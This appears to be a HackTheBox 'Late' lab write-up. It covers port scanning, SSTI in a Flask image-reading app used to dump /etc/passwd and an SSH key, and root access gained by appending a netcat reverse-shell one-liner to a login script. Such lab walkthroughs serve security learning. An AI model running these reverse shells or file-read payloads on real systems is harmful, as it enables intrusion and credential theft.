---
layout: post
title: Late HTB Writeup
excerpt_separator: <!--more-->
---

Late Htb Writeup
---

![late](https://user-images.githubusercontent.com/96860148/172097378-e0db8140-3297-481a-af43-f5d7f98e4773.png)

1.Enumeration
---
<!--more-->

nmap
~~~
┌──(wolf㉿piratesec)-[~/Htb/late]
└─$ nmap --min-rate 10000 -p- 10.129.227.134 -oN nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 03:58 EDT
Warning: 10.129.227.134 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.227.134
Host is up (0.19s latency).
Not shown: 58789 closed tcp ports (conn-refused), 6744 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 41.48 seconds
~~~

The nmap scan did not give much results and port 80 will be our foothold.

### port 80
Looking around in the web server I find a link to an online photo editor.

![editor](https://user-images.githubusercontent.com/96860148/172098611-ae7eddec-8fc3-42b2-a824-60baf33d2f6b.png)

Heading there I'm taken to **images.late.htb** . Time to add it to /etc/hosts
~~~
10.129.227.134  late.htb
10.129.227.134  images.late.htb
~~~

#### Images.late.htb

![images late](https://user-images.githubusercontent.com/96860148/172099127-386d6e77-c092-45a0-b25c-4c31d4a3d745.png)

I uploaded this picture

![late](https://user-images.githubusercontent.com/96860148/172097378-e0db8140-3297-481a-af43-f5d7f98e4773.png)

and got back results,txt which had...

![results](https://user-images.githubusercontent.com/96860148/172099605-5b3f70a9-ad75-4df3-b436-4a3d9508bdc8.png)

This smelled of SSTI....

# [SSTI (From Hacktricks)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

## Detect

The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as the polyglot ${{<%[%'"}}%\.

Detect - Plaintext context

The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expression:

So i'm going to use this image with mathematical operations to see if the site is vulnerable to SSTI...

![payload](https://user-images.githubusercontent.com/96860148/172100440-b2844de1-704e-45c9-b84b-76b0c93addfe.png)

Which gives back ...

![results1](https://user-images.githubusercontent.com/96860148/172100701-9b66cc81-abce-4422-b62c-c1558535d99d.png)

The site is vulnerable to SSTI..

2 Foothold
---
## Exploitation

Since it's a flask application I'll try to read the contents of the /etc/passwd using this payload

![payload1](https://user-images.githubusercontent.com/96860148/172102020-3fb83062-2510-454e-8573-3afa50eb1ae6.png)

Which gives me
~~~
<p>o
7 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin

</p>
~~~

Looking in the /etc/passwd file I can see there is a user called **sc_acc**. Remember port 22 was open from the nmap scan. I'll try to read svc_acc's ssh private key...

The payload...

![1](https://user-images.githubusercontent.com/96860148/172102374-39d23e05-45f4-476d-994f-31d899a29ef6.png)

And voila...the private key..

![key](https://user-images.githubusercontent.com/96860148/172102500-0f158cb9-efd1-4df5-aecb-45260137c4ac.png)

I give the key necessary permissions **chmod +600 rsa** and use it to login to ssh and read the user flag.

![ssh](https://user-images.githubusercontent.com/96860148/172103225-76eaadfe-986b-42b3-936e-66fb05f4303b.png)


3 Privesc
---
Enter linpeas

I'm going to start a python server on my local machine to transfer linpeas to the compromised machine and try to look for ways to escalate priviledges..

![python](https://user-images.githubusercontent.com/96860148/172104066-efd5cdf1-01da-4363-9b2f-63cb82f1d06e.png)

Then use curl to get the file

![curl](https://i.imgur.com/NzEHzqz.png)

Looking at the output of linpeas and using this guide..

![help](https://i.imgur.com/0TRtKpB.png)

I find this interesting file..

![file](https://i.imgur.com/Zh6Z9Qx.png)

Rading the contents of the file, the script runs every time a user logins or exits in. I'll append a reverse shell to the script to see if I'll get something

~~~
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.47 1234 >/tmp/f" >> ssh-alert.sh
~~~
Along the way I got some minor issues and reset the machine to get it as good as new.

I start a netcat listener on my local machine and when I exit from my ssh session, I get a reverse shell..as ROOT !!

![rev](https://i.imgur.com/m2FfaMN.png)
